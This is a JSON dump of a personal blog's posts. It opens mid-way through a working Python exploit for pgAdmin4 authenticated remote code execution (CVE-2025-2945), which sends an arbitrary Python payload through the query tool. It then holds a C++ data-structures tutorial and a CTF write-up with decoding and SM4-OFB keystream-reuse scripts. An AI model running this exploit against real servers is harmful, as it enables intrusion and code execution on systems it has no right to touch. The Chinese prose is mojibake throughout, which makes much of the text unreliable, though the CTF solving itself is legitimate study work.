csrf_token is None: return False resp = session.post( urljoin(target_url, \u0026#39;authenticate/login\u0026#39;), data={ \u0026#34;csrf_token\u0026#34;: csrf_token, \u0026#34;email\u0026#34;: username, \u0026#34;password\u0026#34;: password, \u0026#34;language\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;internal_button\u0026#34;: \u0026#34;login\u0026#34; }, allow_redirects=False, ) if not resp.ok or resp.headers.get(\u0026#39;Location\u0026#39;, \u0026#39;\u0026#39;).endswith(\u0026#39;/login\u0026#39;): print(\u0026#34;[!] Failed to authenticate to pgAdmin\u0026#34;) return False print(\u0026#34;[+] Successfully authenticated to pgAdmin\u0026#34;) # Refresh CSRF token csrf_token = get_csrf_token(session, target_url) if csrf_token is None: return False session.headers.update({\u0026#34;X-pgA-CSRFToken\u0026#34;: csrf_token}) # Find a valid server ID sgid = randint(1, 10) sid = None for i in range(1, max_server_id + 1): resp = session.get( urljoin(target_url, f\u0026#39;/sqleditor/get_server_connection/{sgid}/{i}\u0026#39;), headers={\u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;} ) if resp.status_code == 200: if resp.json().get(\u0026#39;data\u0026#39;, {}).get(\u0026#39;status\u0026#39;) is True: print(\u0026#34;[+] Found valid server ID:\u0026#34;, i) sid = i break else: print(f\u0026#34;[!] Received {resp.status_code} when trying to find server ID\u0026#34;) print(\u0026#34;[!] Received body:\u0026#34;, resp.text) return False if sid is None: print(\u0026#34;[!] Failed to find a valid server ID, try increasing MAX_SERVER_ID\u0026#34;) return False # Initialize sqleditor trans_id = randint(1_000_000, 9_999_999) did = randint(10000, 99999) resp = session.post( urljoin(target_url, f\u0026#34;/sqleditor/initialize/sqleditor/{trans_id}/{sgid}/{sid}/{did}\u0026#34;), json={ \u0026#34;user\u0026#34;: db_user, \u0026#34;password\u0026#34;: db_pass, \u0026#34;role\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;dbname\u0026#34;: db_name, } ) if not resp.ok: print(\u0026#34;[!] Failed to initialize sqleditor\u0026#34;) return False # Send the payload print(\u0026#34;[+] Exploiting the target...\u0026#34;) resp = session.post( urljoin(target_url, f\u0026#34;/sqleditor/query_tool/download/{trans_id}\u0026#34;), json={\u0026#34;query_commited\u0026#34;: payload}, headers={ \u0026#34;Referer\u0026#34;: urljoin(target_url, f\u0026#34;/sqleditor/panel/{trans_id}?is_query_tool=true\u0026#34;) } ) if resp.status_code == 500: print(\u0026#34;[+] Received expected 500 response:\u0026#34;, resp.text) return True else: print( \u0026#34;[!] Received unexpected response code from the exploit attempt:\u0026#34;, resp.status_code, resp.text ) return False if __name__ == \u0026#39;__main__\u0026#39;: import argparse import sys parser = argparse.ArgumentParser(description=\u0026#34;pgAdmin4 query tool authenticated RCE (CVE-2025-2945) exp\u0026#34;) parser.add_argument( \u0026#34;--target-url\u0026#34;, required=True, help=\u0026#34;Base URL of the target pgAdmin4 instance (http://RHOST:RPORT/)\u0026#34; ) parser.add_argument(\u0026#34;--username\u0026#34;, help=\u0026#34;pgAdmin4 username\u0026#34;, required=True) parser.add_argument(\u0026#34;--password\u0026#34;, help=\u0026#34;pgAdmin4 password\u0026#34;, required=True) parser.add_argument( \u0026#34;--db-user\u0026#34;, help=\u0026#34;Username of the database used to initialize sqleditor\u0026#34;, required=True ) parser.add_argument(\u0026#34;--db-pass\u0026#34;, help=\u0026#34;Database password\u0026#34;, required=True) parser.add_argument(\u0026#34;--db-name\u0026#34;, help=\u0026#34;Database db name\u0026#34;, required=True) parser.add_argument(\u0026#34;--payload\u0026#34;, help=\u0026#34;Payload (Python code)\u0026#34;, required=True) parser.add_argument(\u0026#34;--max-server-id\u0026#34;, type=int, default=10, help=\u0026#34;Maximum number of Server IDs to try\u0026#34;) ns = parser.parse_args() sys.exit(int(not exploit(ns.target_url, ns.username, ns.password, ns.db_name, ns.db_user, ns.db_pass, ns.payload, ns.max_server_id))) ","date":"2025-11-01T00:00:00Z","permalink":"https://Oight.github.io/p/cve-2025-2945-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"CVE-2025-2945 æ¼æ´å¤ç°"},{"content":"æ•°æ®ç»“æ„å­¦ä¹ \ræ‰‹åŠ¨å®ç°åŠ¨æ€æ•°ç»„\råŠ¨æ€æ•°ç»„çš„è¦æ±‚\råŠ¨æ€æ•°ç»„éœ€è¦å®ç°ä»¥ä¸‹ä¸‰ä¸ªè¦æ±‚ï¼š 1.è‡ªåŠ¨æ‰©ç¼©å®¹ 2.æ£€æŸ¥ç´¢å¼•è¾¹ç•Œé˜²æ­¢æ•°ç»„è¶Šç•Œ 3.åŠæ—¶åˆ é™¤å…ƒç´ é˜²æ­¢å†…å­˜æ³„æ¼\nå…·ä½“å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdexcept\u0026gt; using namespace std; template\u0026lt;typename E\u0026gt; class MyArrayList{ private: // çœŸæ­£å­˜å‚¨æ•°æ®çš„æ•°ç»„ E* data; // æ•°ç»„ä¸­çš„å…ƒç´ ä¸ªæ•° int size; // æ•°ç»„çš„æœ€å¤§å®¹é‡ int cap; // åˆå§‹å®¹é‡ static const int INIT_CAP = 1; public: MyArrayList() { this -\u0026gt; data = new E[INIT_CAP]; this -\u0026gt; size = 0; this -\u0026gt; cap = INIT_CAP; } MyArrayList(int initCapacity) { this -\u0026gt; data = new E[initCapacity]; this -\u0026gt; size = 0; this -\u0026gt; cap = initCapacity; } // å¢ void addLast(E e) { if (size == cap) { resize(cap * 2); } data[size] = e; size++; } void add(int index, E e) { checkPositionIndex(index); if (size == cap) { resize(cap * 2); } for (int i = size - 1; i \u0026gt;= index; i--) { data[i + 1] = data[i]; } data[index] = e; size++; } void addFirst(E e) { add(0,e); } // åˆ  E removeLast() { if (size == 0) { throw std::out_of_range(\u0026#34;NoSuchElementException\u0026#34;); } if (size == cap / 4) { resize(cap / 2); } E deletedVal = data[size - 1]; data[size - 1] = E(); size--; return deletedVal; } E remove(int index) { checkElementIndex(index); if (size == cap / 4) { resize(cap / 2); } E deletedVal = data[index]; for (int i = index + 1; i \u0026lt; size; i++) { data[i - 1] = data[i]; } data[size - 1] = E(); size--; return deletedVal; } E removeFirst() { return remove(0); } // æ”¹ E set(int index, E element) { checkElementIndex(index); E oldVal = data[index]; data[index] = element; return oldVal; } // æŸ¥ E get(int index) { checkElementIndex(index); return data[index]; } // å·¥å…·æ–¹æ³• int getSize() { return size; } bool isEmpty() { return size == 0; } bool isElementIndex(int index) { return index \u0026gt;= 0 \u0026amp;\u0026amp; index \u0026lt; size; } bool isPositionIndex(int index) { return index \u0026gt;= 0 \u0026amp;\u0026amp; index \u0026lt;= size; } void checkElementIndex(int index) { if (!isElementIndex(index)) { throw std::out_of_range(\u0026#34;Index out of bounds\u0026#34;); } } void checkPositionIndex(int index) { if (!isPositionIndex(index)) { throw std::out_of_range(\u0026#34;Index out of bounds\u0026#34;); } } void resize(int newCap) { E* temp = new E[newCap]; for (int i = 0; i \u0026lt; size; i++) { temp[i] = data[i]; } delete[] data; data = temp; cap = newCap; } void display() { cout \u0026lt;\u0026lt; \u0026#34;size=\u0026#34; \u0026lt;\u0026lt; size \u0026lt;\u0026lt; \u0026#34;cap=\u0026#34; \u0026lt;\u0026lt; cap \u0026lt;\u0026lt;endl; for (int i = 0; i \u0026lt; size; i++) { cout \u0026lt;\u0026lt; data[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } ~MyArrayList() { delete[] data; } }; int main() { MyArrayList\u0026lt;int\u0026gt; arr(3); for (int i = 0; i \u0026lt;= 5; i++) { arr.addLast(i); } arr.remove(3); arr.add(1,9); arr.addFirst(100); for (int i = 0; i \u0026lt; arr.getSize(); i++) { std::cout \u0026lt;\u0026lt; arr.get(i) \u0026lt;\u0026lt; std::endl; } return 0; } äºŒå‰æ ‘\räºŒå‰æ ‘çš„å®ç°æ–¹æ³•å’Œé“¾è¡¨æœ‰ç‚¹åƒï¼Œéƒ½ç”±ä¸€ä¸ªä¸ªèŠ‚ç‚¹ç»„æˆï¼ŒèŠ‚ç‚¹åŒ…å«æœ‰èŠ‚ç‚¹çš„å€¼å’ŒæŒ‡å‘ä¸‹ä¸€èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚ä½†å’Œé“¾è¡¨ä¸åŒçš„æ˜¯ï¼ŒäºŒå‰æ ‘æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå¼•ç”¨ï¼ˆæŒ‡é’ˆï¼‰ï¼Œåˆ†åˆ«æŒ‡å‘å·¦å­èŠ‚ç‚¹ï¼ˆleft-child nodeï¼‰å’Œå³å­èŠ‚ç‚¹ï¼ˆright-child nodeï¼‰ï¼Œè¯¥èŠ‚ç‚¹è¢«ç§°ä¸ºè¿™ä¸¤ä¸ªå­èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ï¼ˆparent nodeï¼‰ã€‚å½“ç»™å®šä¸€ä¸ªäºŒå‰æ ‘çš„èŠ‚ç‚¹æ—¶ï¼Œæˆ‘ä»¬å°†è¯¥èŠ‚ç‚¹çš„å·¦å­èŠ‚ç‚¹åŠå…¶ä»¥ä¸‹èŠ‚ç‚¹å½¢æˆçš„æ ‘ç§°ä¸ºè¯¥ç»“ç‚¹çš„å·¦å­æ ‘ï¼ˆleft subtreeï¼‰ï¼ŒåŒç†å¯å¾—å³å­æ ‘ï¼ˆright subtreeï¼‰ã€‚\nåœ¨äºŒå‰æ ‘ä¸­ï¼Œé™¤å¶èŠ‚ç‚¹å¤–å…¶ä»–èŠ‚ç‚¹éƒ½åŒ…å«å­èŠ‚ç‚¹å’Œéç©ºå­æ ‘ã€‚\näºŒå‰æ ‘å¸¸ç”¨æœ¯è¯­ï¼š æ ¹èŠ‚ç‚¹ï¼ˆroot nodeï¼‰ï¼šä½äºäºŒå‰æ ‘é¡¶å±‚çš„èŠ‚ç‚¹ï¼Œæ²¡æœ‰çˆ¶èŠ‚ç‚¹ã€‚ å¶èŠ‚ç‚¹ï¼ˆleaf nodeï¼‰ï¼šæ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ï¼Œå…¶ä¸¤ä¸ªæŒ‡é’ˆå‡æŒ‡å‘None. è¾¹ï¼ˆedgeï¼‰ï¼šè¿æ¥ä¸¤ä¸ªèŠ‚ç‚¹çš„çº¿æ®µï¼Œå³èŠ‚ç‚¹å¼•ç”¨ï¼ˆæŒ‡é’ˆï¼‰ã€‚ èŠ‚ç‚¹æ‰€åœ¨çš„å±‚ï¼ˆlevelï¼‰ï¼šä»é¡¶è‡³åº•é€’å¢ï¼Œæ ¹èŠ‚ç‚¹æ‰€åœ¨å±‚ä¸º1. èŠ‚ç‚¹çš„åº¦ï¼ˆdegreeï¼‰ï¼šèŠ‚ç‚¹çš„å­èŠ‚ç‚¹çš„æ•°é‡ã€‚åœ¨äºŒå‰æ ‘ä¸­ï¼Œåº¦çš„å–å€¼èŒƒå›´0ã€1ã€2ã€‚ äºŒå‰æ ‘çš„é«˜åº¦ï¼ˆheightï¼‰ï¼šä»æ ¹èŠ‚ç‚¹åˆ°æœ€è¿œå¶æ‰€ç»è¿‡çš„è¾¹çš„æ•°é‡ã€‚ èŠ‚ç‚¹çš„æ·±åº¦ï¼ˆdepthï¼‰ï¼šä»æ ¹èŠ‚ç‚¹åˆ°è¯¥èŠ‚ç‚¹æ‰€ç»è¿‡çš„è¾¹çš„æ•°é‡ã€‚ èŠ‚ç‚¹çš„é«˜åº¦ï¼ˆheightï¼‰ï¼šä»è·ç¦»è¯¥èŠ‚ç‚¹æœ€è¿œçš„å¶èŠ‚ç‚¹åˆ°è¯¥èŠ‚ç‚¹æ‰€ç»è¿‡çš„è¾¹çš„æ•°é‡ã€‚\nå®Œæ•´å®ç°äºŒå‰æ ‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class TreeNode { public: int val; TreeNode* left; TreeNode* right; TreeNode(int x) : val(x), left(nullptr), right(nullptr){} }; TreeNode* root = new TreeNode(1); root-\u0026gt;left = new TreeNode(2); root-\u0026gt;right = new TreeNode(3); root-\u0026gt;left-\u0026gt;left = new TreeNode(4); root-\u0026gt;right-\u0026gt;left = new TreeNode(5); root-\u0026gt;right-\u0026gt;right = new TreeNode(6); // æ„å»ºå‡ºæ¥çš„äºŒå‰æ ‘æ˜¯è¿™æ ·çš„ï¼š // 1 // / \\ // 2 3 // / / \\ // 4 5 6 åˆå§‹åŒ–ä¸€ä¸ªäºŒå‰æ ‘ï¼š TreeNode* n1 = new TreeNode(1); TreeNode* n2 = new TreeNode(2); TreeNode* n3 = new TreeNode(3); TreeNode* n4 = new TreeNode(4); TreeNode* n5 = new TreeNode(5); n1-\u0026gt;left = n2; n1-\u0026gt;right = n3; n2-\u0026gt;left = n4; n2-\u0026gt;right = n5; å‘äºŒå‰æ ‘ä¸­æ’å…¥å’Œåˆ é™¤èŠ‚ç‚¹\n1 2 3 4 5 6 7 TreeNode* P = new TreeNode(0); // åœ¨n1 -\u0026gt; n2 ä¸­é—´æ’å…¥èŠ‚ç‚¹ P n1-\u0026gt;left = P; P-\u0026gt;left = n2; // åˆ é™¤èŠ‚ç‚¹P n1-\u0026gt;left = n2; delete P; ","date":"2025-10-22T10:29:47+08:00","permalink":"https://Oight.github.io/p/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/","title":"æ•°æ®ç»“æ„å­¦ä¹ "},{"content":"ç¾ŠåŸæ¯2025 Write UP\rè¢«é˜Ÿé‡Œçš„å¤©æ‰é€‰æ‰‹å¸¦é£äº†ï¼Œå¤ªå¼ºå¤§äº†ï¼ï¼ï¼\nè€Œæˆ‘é™¤äº†ç”¨AIå‡ºä¸€é“PHPååºåˆ—åŒ–ä¹‹å¤–æ¯«æ— è¾“å‡ºQaQ\nMISC\ræˆåŠŸç”·äººèƒŒåçš„å¥³äºº\ræ‰“å¼€é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œæ ¹æ®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨éšè—çš„å›¾ç‰‡æˆ–è€…å…¶ä»–å†…å®¹ã€‚å°è¯•ä½¿ç”¨binwalkã€foremostéƒ½æ— æœã€‚æœ€åæŸ¥è¯¢èµ„æ–™å¯çŸ¥ç”¨äº†Adobe Fireworksä¸“æœ‰çš„åè®®ï¼Œå°è¯•æ‰“å¼€å³å¯å‘ç°éšè—å›¾åƒï¼š å°†å›¾åƒä¸‹æ–¹çš„ç¬¦å·æŒ‰ç…§äºŒè¿›åˆ¶çš„æ–¹å¼ç»„åˆå¾—åˆ°ï¼š\n1 2 3 4 5 6 01000100010000010101001101000011 01010100010001100111101101110111 00110000011011010100010101001110 01011111011000100110010101101000 00110001011011100100010001011111 01001101010001010110111001111101 8ä¸ªä¸€ç»„è§£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; using namespace std; int main(){ string str=\u0026#34;010001000100000101010011010000110101010001000110011110110111011100110000011011010100010101001110010111110110001001100101011010000011000101101110010001000101111101001101010001010110111001111101\u0026#34;; for(int i=0;i\u0026lt;str.length();i+=8){ cout\u0026lt;\u0026lt;(char)stoi(str.substr(i,8).c_str(),nullptr,2); } return 0; } è¿è¡Œå¾—åˆ°ï¼šDASCTF{w0mEN_beh1nD_MEn}\nReverse\rGD1\ré€šè¿‡æ–‡ä»¶æè¿°å¯çŸ¥è¿™æ˜¯Godot Engineç¼–å†™çš„æ¸¸æˆã€‚ä½¿ç”¨GDREå·¥å…·æ‰“å¼€ï¼Œå¯æ‰¾åˆ°æ¸¸æˆé€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 extends Node @export var mob_scene: PackedScene var score var a = \u0026#34;000001101000000001100101000010000011000001100111000010000100000001110000000100100011000100100000000001100111000100010111000001100110000100000101000001110000000010001001000100010100000001000101000100010111000001010011000010010111000010000000000001010000000001000101000010000001000100000110000100010101000100010010000001110101000100000111000001000101000100010100000100000100000001001000000001110110000001111001000001000101000100011001000001010111000010000111000010010000000001010110000001101000000100000001000010000011000100100101\u0026#34; func _ready(): pass func _process(delta: float) -\u0026gt; void : pass func game_over(): $ScoreTimer.stop() $MobTimer.stop() $HUD.show_game_over() func new_game(): score = 0 $Player.start($StartPosition.position) $StartTimer.start() $HUD.update_score(score) $HUD.show_message(\u0026#34;Get Ready\u0026#34;) get_tree().call_group(\u0026#34;mobs\u0026#34;, \u0026#34;queue_free\u0026#34;) func _on_mob_timer_timeout(): var mob = mob_scene.instantiate() var mob_spawn_location = $MobPath / MobSpawnLocation mob_spawn_location.progress_ratio = randf() var direction = mob_spawn_location.rotation + PI / 2 mob.position = mob_spawn_location.position direction += randf_range( - PI / 4, PI / 4) mob.rotation = direction var velocity = Vector2(randf_range(150.0, 250.0), 0.0) mob.linear_velocity = velocity.rotated(direction) add_child(mob) func _on_score_timer_timeout(): score += 1 $HUD.update_score(score) if score == 7906: var result = \u0026#34;\u0026#34; for i in range(0, a.length(), 12): var bin_chunk = a.substr(i, 12) var hundreds = bin_chunk.substr(0, 4).bin_to_int() var tens = bin_chunk.substr(4, 4).bin_to_int() var units = bin_chunk.substr(8, 4).bin_to_int() var ascii_value = hundreds * 100 + tens * 10 + units result += String.chr(ascii_value) $HUD.show_message(result) func _on_start_timer_timeout(): $MobTimer.start() $ScoreTimer.start() å‘ç°å½“å¾—åˆ†åˆ°è¾¾7906æ—¶ä¼šè°ƒç”¨ä¸€ä¸ªè§£å¯†ç®—æ³•ï¼Œå°†æ•°ç»„açš„æ•°æ®è§£å¯†ç„¶åæ‰“å°ã€‚å°è¯•æŒ‰ç…§é€»è¾‘ç¼–å†™è§£å¯†ç¨‹åºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;bitset\u0026gt; using namespace std; int bin_to_int(const string \u0026amp;bin) { return stoi(bin, nullptr, 2); } string decodeBinaryString(const string \u0026amp;a) { string result; for (size_t i = 0; i + 12 \u0026lt;= a.length(); i += 12) { string bin_chunk = a.substr(i, 12); int hundreds = bin_to_int(bin_chunk.substr(0, 4)); int tens = bin_to_int(bin_chunk.substr(4, 4)); int units = bin_to_int(bin_chunk.substr(8, 4)); int ascii_value = hundreds * 100 + tens * 10 + units; result.push_back(static_cast\u0026lt;char\u0026gt;(ascii_value)); } return result; } int main() { string a = \u0026#34;000001101000000001100101000010000011000001100111000010000100000001110000000100100011000100100000000001100111000100010111000001100110000100000101000001110000000010001001000100010100000001000101000100010111000001010011000010010111000010000000000001010000000001000101000010000001000100000110000100010101000100010010000001110101000100000111000001000101000100010100000100000100000001001000000001110110000001111001000001000101000100011001000001010111000010000111000010010000000001010110000001101000000100000001000010000011000100100101\u0026#34;; cout \u0026lt;\u0026lt; decodeBinaryString(a) \u0026lt;\u0026lt; endl; return 0; } è¿è¡Œï¼Œå¾—åˆ°Flagï¼šDASCTF{xCuBiFYr-u5aP2-QjspKk-rh0LO-w9WZ8DeS}\nDS\rSM4-OFB\rè®©AIåˆ†æä¸€ä¸‹åŠ å¯†è¿‡ç¨‹å¹¶ç¼–å†™è§£å¯†è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 # ä½¿ç”¨æ­¤ä»£ç è¿›è¡Œæœ¬åœ°è¿è¡Œæˆ–åœ¨æœ¬ç¯å¢ƒè¿è¡Œæ¥æ¢å¤å¯†æ–‡ï¼ˆSM4-OFB å‡è®¾ä¸‹ï¼‰ # ä»£ç ä¼šï¼š # 1) ä½¿ç”¨å·²çŸ¥ record1 çš„æ˜æ–‡å’Œå¯†æ–‡è®¡ç®—æ¯ä¸ªåˆ†å—çš„ keystreamï¼ˆå‡è®¾ä½¿ç”¨ PKCS#7 å¡«å……åˆ° 16 å­—èŠ‚å¹¶ä¸”æ¯ä¸ªå­—æ®µå•ç‹¬ä»¥ OFB ä»ç›¸åŒ IV å¼€å§‹ï¼‰ # 2) ç”¨å¾—åˆ°çš„ keystream å»è§£ record2 å¯¹åº”å­—æ®µçš„å¯†æ–‡ï¼Œå°è¯•å»æ‰å¡«å……å¹¶è¾“å‡ºæ˜æ–‡ï¼ˆUTF-8 è§£ç ï¼‰ # # è¯´æ˜ï¼šæ­¤è„šæœ¬**ä¸éœ€è¦å¯†é’¥**ï¼Œåªåˆ©ç”¨äº†å·²çŸ¥æ˜æ–‡ä¸ç›¸åŒ IV/æ¨¡å¼å¤ç”¨å¯¼è‡´çš„ keystream å¯é‡ç”¨æ€§ï¼ˆè¿™æ˜¯ OFB/CTR çš„å…¸å‹å¼±ç‚¹ï¼‰ # è¯·ç¡®ä¿å®‰è£… pycryptodomeï¼ˆå¦‚æœéœ€è¦å¯¹ç…§åŠ å¯†è¿›è¡ŒéªŒè¯ï¼‰ï¼Œä½†æ­¤è„šæœ¬åªåšå¼‚æˆ–æ“ä½œï¼Œä¸è°ƒç”¨åŠ å¯†åº“ã€‚ from binascii import unhexlify, hexlify from Crypto.Util.Padding import pad, unpad def xor_bytes(a,b): return bytes(x^y for x,y in zip(a,b)) # record1 å·²çŸ¥æ˜æ–‡ä¸å¯†æ–‡ï¼ˆç”¨æˆ·æä¾›ï¼‰ record1 = { \u0026#34;name_plain\u0026#34;: \u0026#34;è’‹å®ç²\u0026#34;.encode(\u0026#39;utf-8\u0026#39;), \u0026#34;name_cipher_hex\u0026#34;: \u0026#34;cef18c919f99f9ea19905245fae9574e\u0026#34;, \u0026#34;phone_plain\u0026#34;: \u0026#34;17145949399\u0026#34;.encode(\u0026#39;utf-8\u0026#39;), \u0026#34;phone_cipher_hex\u0026#34;: \u0026#34;17543640042f2a5d98ae6c47f8eb554c\u0026#34;, \u0026#34;id_plain\u0026#34;: \u0026#34;220000197309078766\u0026#34;.encode(\u0026#39;utf-8\u0026#39;), \u0026#34;id_cipher_hex\u0026#34;: \u0026#34;1451374401262f5d9ca4657bcdd9687eac8baace87de269e6659fdbc1f3ea41c\u0026#34;, \u0026#34;iv_hex\u0026#34;: \u0026#34;6162636465666768696a6b6c6d6e6f70\u0026#34; } # record2 ä»…å¯†æ–‡ï¼ˆç”¨æˆ·æä¾›ï¼‰ record2 = { \u0026#34;name_cipher_hex\u0026#34;: \u0026#34;c0ffb69293b0146ea19d5f48f7e45a43\u0026#34;, \u0026#34;phone_cipher_hex\u0026#34;: \u0026#34;175533440427265293a16447f8eb554c\u0026#34;, \u0026#34;id_cipher_hex\u0026#34;: \u0026#34;1751374401262f5d9ca36576ccde617fad8baace87de269e6659fdbc1f3ea41c\u0026#34;, \u0026#34;iv_hex\u0026#34;: \u0026#34;6162636465666768696a6b6c6d6e6f70\u0026#34; } BS = 16 # åˆ†ç»„é•¿åº¦ # å·¥å…·ï¼šæŠŠå­—æ®µæŒ‰ 16 å­—èŠ‚å—åˆ‡åˆ† def split_blocks(b): return [b[i:i+BS] for i in range(0, len(b), BS)] # 1) è®¡ç®— record1 æ¯ä¸ªå­—æ®µçš„ keystreamï¼ˆå‡è®¾åŠ å¯†å‰ç”¨ PKCS#7 å¡«å……ï¼Œç„¶åæŒ‰å— XORï¼‰ ks_blocks = {\u0026#34;name\u0026#34;: [], \u0026#34;phone\u0026#34;: [], \u0026#34;id\u0026#34;: []} # name C_name = unhexlify(record1[\u0026#34;name_cipher_hex\u0026#34;]) P_name_padded = pad(record1[\u0026#34;name_plain\u0026#34;], BS) for c, p in zip(split_blocks(C_name), split_blocks(P_name_padded)): ks_blocks[\u0026#34;name\u0026#34;].append(xor_bytes(c, p)) # phone C_phone = unhexlify(record1[\u0026#34;phone_cipher_hex\u0026#34;]) P_phone_padded = pad(record1[\u0026#34;phone_plain\u0026#34;], BS) for c, p in zip(split_blocks(C_phone), split_blocks(P_phone_padded)): ks_blocks[\u0026#34;phone\u0026#34;].append(xor_bytes(c, p)) # id (å¯èƒ½ä¸ºä¸¤å—) C_id = unhexlify(record1[\u0026#34;id_cipher_hex\u0026#34;]) P_id_padded = pad(record1[\u0026#34;id_plain\u0026#34;], BS) for c, p in zip(split_blocks(C_id), split_blocks(P_id_padded)): ks_blocks[\u0026#34;id\u0026#34;].append(xor_bytes(c, p)) print(\u0026#34;Derived keystream blocks (hex):\u0026#34;) for field, blks in ks_blocks.items(): print(field, [b.hex() for b in blks]) # 2) ä½¿ç”¨ä¸Šè¿° keystream å»è§£ record2 ç›¸åº”å­—æ®µ def recover_field(cipher_hex, ks_list): C = unhexlify(cipher_hex) blocks = split_blocks(C) recovered_padded = b\u0026#39;\u0026#39;.join(xor_bytes(c, ks) for c, ks in zip(blocks, ks_list)) # å°è¯•å»é™¤å¡«å……å¹¶è§£ç  try: recovered = unpad(recovered_padded, BS).decode(\u0026#39;utf-8\u0026#39;) except Exception as e: recovered = None return recovered, recovered_padded name_rec, name_padded = recover_field(record2[\u0026#34;name_cipher_hex\u0026#34;], ks_blocks[\u0026#34;name\u0026#34;]) phone_rec, phone_padded = recover_field(record2[\u0026#34;phone_cipher_hex\u0026#34;], ks_blocks[\u0026#34;phone\u0026#34;]) id_rec, id_padded = recover_field(record2[\u0026#34;id_cipher_hex\u0026#34;], ks_blocks[\u0026#34;id\u0026#34;]) print(\u0026#34;\\nRecovered (if OFB with same IV/key and per-field restart):\u0026#34;) print(\u0026#34;Name padded bytes (hex):\u0026#34;, name_padded.hex()) print(\u0026#34;Name plaintext:\u0026#34;, name_rec) print(\u0026#34;Phone padded bytes (hex):\u0026#34;, phone_padded.hex()) print(\u0026#34;Phone plaintext:\u0026#34;, phone_rec) print(\u0026#34;ID padded bytes (hex):\u0026#34;, id_padded.hex()) print(\u0026#34;ID plaintext:\u0026#34;, id_rec) # å¦‚æœè§£ç å¤±è´¥ï¼Œæ‰“å°åŸå§‹ bytes ä»¥ä¾¿äººå·¥åˆ†æ # if name_rec is None: # print(\u0026#34;\\nName padded bytes (raw):\u0026#34;, name_padded) # if phone_rec is None: # print(\u0026#34;Phone padded bytes (raw):\u0026#34;, phone_padded) # if id_rec is None: # print(\u0026#34;ID padded bytes (raw):\u0026#34;, id_padded) # ç»“æŸ å‘ç°èƒ½å¤Ÿè®¡ç®—å¾—åˆ°å§“åå’Œèº«ä»½è¯å·ï¼Œå†å°†Excelè¡¨ä¸­æ‰€æœ‰äººådumpå‡ºæ¥æ”¾åˆ°txté‡Œï¼Œè®©AIå†™ä¸ªè„šæœ¬æ‰¹é‡è®¡ç®—ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 #!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; Batch-decrypt names encrypted with SM4-OFB where the same IV/nonce was reused and one known plaintext/ciphertext pair is available (from record1). This script: - Reads an input file (one hex-encoded cipher per line). - Uses the known record1 name plaintext \u0026amp; ciphertext to derive the OFB keystream blocks for the name-field (keystream = C XOR P_padded). - XORs each input cipher with the derived keystream blocks to recover plaintext, removes PKCS#7 padding if present, and prints a line containing: \u0026lt;recovered_name\u0026gt;\\t\u0026lt;cipher_hex\u0026gt; Usage: python3 sm4_ofb_batch_decrypt_names.py names_cipher.txt Notes: - This assumes each name was encrypted as a separate field starting OFB from the same IV (so keystream blocks align for the name-field) and PKCS#7 padding was used before encryption. If names exceed the number of derived keystream blocks the script will attempt to reuse the keystream cyclically (warns about it), but ideally you should supply a longer known plaintext/ciphertext pair to derive more keystream blocks. - Requires pycryptodome for padding utilities: pip install pycryptodome Edit the KNOWN_* constants below if your known record1 values differ. \u0026#34;\u0026#34;\u0026#34; import sys from binascii import unhexlify, hexlify from Crypto.Util.Padding import pad, unpad # ----------------------- # ----- KNOWN VALUES ---- # 